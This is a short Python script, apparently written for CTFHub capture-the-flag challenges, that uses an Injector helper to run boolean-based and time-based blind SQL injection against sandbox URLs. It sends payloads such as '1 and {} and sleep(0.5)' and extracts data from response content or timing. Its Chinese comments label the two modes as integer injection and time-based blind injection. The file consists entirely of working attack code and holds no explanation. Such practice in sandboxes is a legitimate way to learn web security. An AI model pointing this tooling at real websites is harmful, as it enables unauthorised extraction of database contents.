from bool_injection import Injector
import requests

def checker(payload: str) -> bool:
    url = "http://challenge-4d80a870a09146f2.sandbox.ctfhub.com:10800/"
    params = { "id": payload }
    response = requests.get(url, params=params)
    if response.status_code != 200: 
        raise ConnectionError("Failed to request with message:", response.status_code, response.content)
    return 'query_success' in response.content.decode()

def time_checker(payload: str) -> bool:
    url = "http://challenge-8d5b38400dcb41d3.sandbox.ctfhub.com:10800/"
    params = { "id": payload }
    response = requests.get(url, params=params)
    if response.status_code != 200: 
        raise ConnectionError("Failed to request")
    return response.elapsed.total_seconds() > 0.5

def manual_checker(payload: str) -> bool:
    print(payload)
    good = input()
    return good == '1'

# injector = Injector("1 and {}", checker) # 整数型注入
injector = Injector(Injector.Templates("1 and {} and sleep(0.5)"), time_checker) # 时间盲注

while True:
    target = input()
    print(injector.get_str(target))